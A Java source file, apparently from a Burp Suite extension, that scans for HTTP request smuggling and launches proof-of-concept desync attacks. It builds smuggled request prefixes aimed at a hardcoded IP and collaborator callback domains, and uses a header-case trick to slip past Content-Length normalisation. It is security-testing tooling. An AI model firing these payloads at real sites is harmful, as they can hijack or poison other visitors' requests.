package burp;

import org.apache.commons.lang3.tuple.ImmutablePair;
import org.apache.commons.lang3.tuple.Pair;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.*;

public class ChunkContentScan extends SmuggleScanBox implements IScannerCheck  {

    ChunkContentScan(String name) {
        super(name);
        scanSettings.importSettings(DesyncBox.h1Permutations);
        scanSettings.importSettings(DesyncBox.h1Settings);
    }

    public boolean doConfiguredScan(byte[] original, IHttpService service, HashMap<String, Boolean> config) {
        if (Utilities.globalSettings.getBoolean("skip vulnerable hosts") && BurpExtender.hostsToSkip.containsKey(service.getHost())) {
            return false;
        }

        original = setupRequest(original);
        original = Utilities.addOrReplaceHeader(original, "User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36");
        original = Utilities.addOrReplaceHeader(original, "Transfer-Encoding", "chunked");
        original = Utilities.setHeader(original, "Connection", "close", true);


        if (Utilities.globalSettings.getBoolean("skip straight to poc")) {
            tryPocs(original, service, true, config);
            tryPocs(original, service, false, config);
            return false;
        }

        byte[] syncedReq = makeChunked(original, 0, 0, config, false);
        Resp syncedResp = request(service, syncedReq, 0, true);
        if (syncedResp.failed() || (Utilities.globalSettings.getBoolean("only report exploitable") && (syncedResp.getStatus() == 400 || syncedResp.getStatus() == 501))) {
            Utilities.log("Timeout on first request. Aborting.");
            return false;
        }

        byte[] syncedBreakReq = makeChunked(original, 0, 0, config, true);
        Resp syncedBreakResp = request(service, syncedBreakReq, 0, true);
        if (!syncedBreakResp.failed()) {

            byte[] reverseLength = makeChunked(original, -6, 0, config, true);

            Resp truncatedChunk = request(service, reverseLength, 3, true);
            if (truncatedChunk.timedOut()) {

                if (request(service, syncedBreakReq, 0, true).timedOut()) {
                    return false;
                }

                if (truncatedChunk.getReq().getResponse() != null) {
                    Utilities.out("Unexpected report with response");
                }

                String title = "Possible HTTP Request Smuggling: CL.TE " + String.join("|", config.keySet());

                Resp retryAlive = leftAlive(syncedReq, service);
                if (retryAlive != null ) {
                    syncedResp = retryAlive;
                    title += " left-alive";
                }

                if (truncatedChunk.getReq().getResponse() != null) {
                    title += " (delayed response)";
                }

                report(title,
                        "Burp issued a request, and got a response. Burp then issued the same request, but with a shorter Content-Length, and got a timeout.<br/> " +
                                "This suggests that the front-end system is using the Content-Length header, and the backend is using the Transfer-Encoding: chunked header. You should be able to manually verify this using the Repeater, provided you uncheck the 'Update Content-Length' setting on the top menu. <br/>" +
                                "As such, it may be vulnerable to HTTP Desync attacks, aka Request Smuggling. <br/>" +
                                "To attempt an actual Desync attack, right click on the attached request and choose 'Desync attack'. Please note that this is not risk-free - other genuine visitors to the site may be affected.<br/><br/>Please refer to the following posts for further information: <br/><a href=\"https://portswigger.net/blog/http-desync-attacks\">https://portswigger.net/blog/http-desync-attacks</a><br/><a href=\"https://portswigger.net/research/http-desync-attacks-what-happened-next\">https://portswigger.net/research/http-desync-attacks-what-happened-next</a><br/><a href=\"https://portswigger.net/research/breaking-the-chains-on-http-request-smuggler\">https://portswigger.net/research/breaking-the-chains-on-http-request-smuggler</a>",
                        syncedResp, syncedBreakResp, truncatedChunk);
                tryPocs(original, service, true, config);
                return true;
            }
        }

        // this is unsafe for CL-TE, so we only attempt it if CL-TE detection failed
        byte[] reverseLength = makeChunked(original, 1, 0, config, false); //Utilities.setHeader(baseReq, "Content-Length", "4");
        ByteArrayOutputStream reverseLengthBuilder = new ByteArrayOutputStream();
        try {
            reverseLengthBuilder.write(reverseLength);
            reverseLengthBuilder.write('X');
            reverseLength = reverseLengthBuilder.toByteArray();
        } catch (IOException e) {

        }
        Resp truncatedChunk = request(service, reverseLength, 3, true);

        if (truncatedChunk.timedOut()) {

            if (request(service, syncedReq, 0, true).timedOut()) {
                return false;
            }

            String title = "Possible HTTP Request Smuggling: TE.CL " + String.join("|", config.keySet());

            Resp retryAlive = leftAlive(syncedReq, service);
            if (retryAlive != null ) {
                syncedResp = retryAlive;
                title += " left-alive";
            }

            if (truncatedChunk.getReq().getResponse() != null) {
                title += " (delayed response)";
            }

            report(title,
                    "Burp issued a request, and got a response. Burp then issued the same request, but with a closing chunk in the body, and got a timeout. <br/>" +
                            "This suggests that the front-end system is using the Transfer-Encoding header, and the backend is using the Content-Length header. You should be able to manually verify this using the Repeater. <br/>" +
                            "As such, it may be vulnerable to HTTP Desync attacks, aka Request Smuggling. <br/>" +
                            "To attempt an actual Desync attack, right click on the attached request and choose 'Desync attack'. Please note that this is not risk-free - other genuine visitors to the site may be affected. <br/><br/><br/>Please refer to the following posts for further information: <br/><a href=\"https://portswigger.net/blog/http-desync-attacks\">https://portswigger.net/blog/http-desync-attacks</a><br/><a href=\"https://portswigger.net/research/http-desync-attacks-what-happened-next\">https://portswigger.net/research/http-desync-attacks-what-happened-next</a><br/><a href=\"https://portswigger.net/research/breaking-the-chains-on-http-request-smuggler\">https://portswigger.net/research/breaking-the-chains-on-http-request-smuggler</a>",
                    syncedResp, truncatedChunk);
            tryPocs(original, service, false, config);
            return true;
        }

        return false;
    }

    static List<String> pocTechniques = Arrays.asList("G", "headerConcat", "bodyConcat", "collab", "collab-header", "collab-XFO-header", "collab-abs", "collab-at", "collab-blind");
    static boolean tryPocs(byte[] base, IHttpService service, boolean CLTE, HashMap<String, Boolean> config) {

        HashSet<Boolean> results = new LinkedHashSet<>();
        String collabWithHost = service.getHost() + "."  + Utilities.globalSettings.getString("collab-domain");
        for (String technique: pocTechniques) {

            if (!Utilities.globalSettings.getBoolean("poc: "+technique)) {
                continue;
            }

            String inject;
            switch (technique) {
                case "G":
                    inject = "G";
                    break;
                case "headerConcat":
                    inject = "GET /?x=5u0ddwptlhzwzk0kkdjae3bt9kfc31/"+service.getHost()+" HTTP/1.1\r\n" +
                            "Host: 52.16.21.24\r\n" +
                            "Foo: x";
                    break;
                case "bodyConcat":
                    inject = "POST /?x=5u0ddwptlhzwzk0kkdjae3bt9kfc31/"+service.getHost()+" HTTP/1.1\r\n" +
                            "Host: 52.16.21.24\r\n" +
                            "Content-Type: application/x-www-form-urlencoded\r\n" +
                            "Content-Length: 8\r\n\r\n" +
                            "foo=";
                    break;
                case "collab":
                    inject = "GET / HTTP/1.1\r\n" +
                            "Host: "+collabWithHost+"\r\n\r\n";
                    break;
                case "collab-header":
                    inject = "GET / HTTP/1.1\r\n" +
                            "Host: "+collabWithHost+"\r\n" +
                            "X-Foo: X";
                    break;
                case "collab-XFO-header":
                    inject = "GET / HTTP/1.1\r\n" +
                            "X-Forwarded-Host: "+collabWithHost+"\r\n" +
                            "X-Foo: X";
                    break;
                case "poc: collab-abs":
                    inject = "GET http://"+collabWithHost+"/ HTTP/1.1\r\n" +
                "X-Foo: X";
                    break;
                case "collab-at":
                    inject = "GET @"+collabWithHost+"/ HTTP/1.1\r\n" +
                            "X-Foo: X";
                    break;

                case "collab-blind":
                    inject = String.format(
                            "GET / HTTP/1.1\r\n" +
                                    "Host: %s\r\n" +
                                    "Referer: http://ref.%s/\r\n" +
                                    "X-Forwarded-For: xff.%s\r\n" +
                                    "True-Client-IP: tci.%s\r\n" +
                                    "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0\r\n" +
                                    "Accept-Encoding: gzip, deflate\r\n" +
                                    "Accept: */*\r\n" +
                                    "Accept-Language: en\r\n" +
                                    "connection: close\r\n\r\n", service.getHost(), collabWithHost, collabWithHost, collabWithHost);
                    break;
                default:
                    throw new RuntimeException("Invalid poc type");

            }

            boolean outcome = launchPoc(base, technique, CLTE, false, inject, service, config);
            if (!outcome) {
                outcome = launchPoc(base, technique, CLTE, true, inject, service, config);
            }
            results.add(outcome);
        }

        return results.contains(Boolean.TRUE);
    }


    static Pair<String, Integer> getCLTEAttack(byte[] base, String inject, HashMap<String, Boolean> config) {
        byte[] prep = Utilities.setHeader(base, "Connection", "keep-alive");
        prep = bypassContentLengthFix(makeChunked(prep, inject.length(), 0, config, false));
        return new ImmutablePair<>(Utilities.helpers.bytesToString(prep)+inject, inject.length() * -1);
    }

    static Pair<String, Integer> getTECLAttack(byte[] base, String inject, HashMap<String, Boolean> config) {
        try {
            byte[] initial = Utilities.setHeader(base, "Connection", "keep-alive");
            ByteArrayOutputStream attackStream = new ByteArrayOutputStream();
            attackStream.write(initial);
            attackStream.write(inject.getBytes());

            byte[] attack = makeChunked(attackStream.toByteArray(), 0, 0, config, false);
            String attackString = Utilities.helpers.bytesToString(attack);
            int CL = attackString.lastIndexOf(inject) - Utilities.getBodyStart(attack);
            attack = Utilities.addOrReplaceHeader(attack, "Content-Length", String.valueOf(CL));

            attack = bypassContentLengthFix(attack);
            //Utils.out(Utilities.helpers.bytesToString(attack));
            return new ImmutablePair<>(Utilities.helpers.bytesToString(attack), Utilities.getBodyStart(attack)+CL+2);
        } catch (IOException e) {
            return null;
        }
    }

    static byte[] bypassContentLengthFix(byte[] req) {
        return Utilities.replace(req, "Content-Length: ".getBytes(), "Content-length: ".getBytes());
    }

}

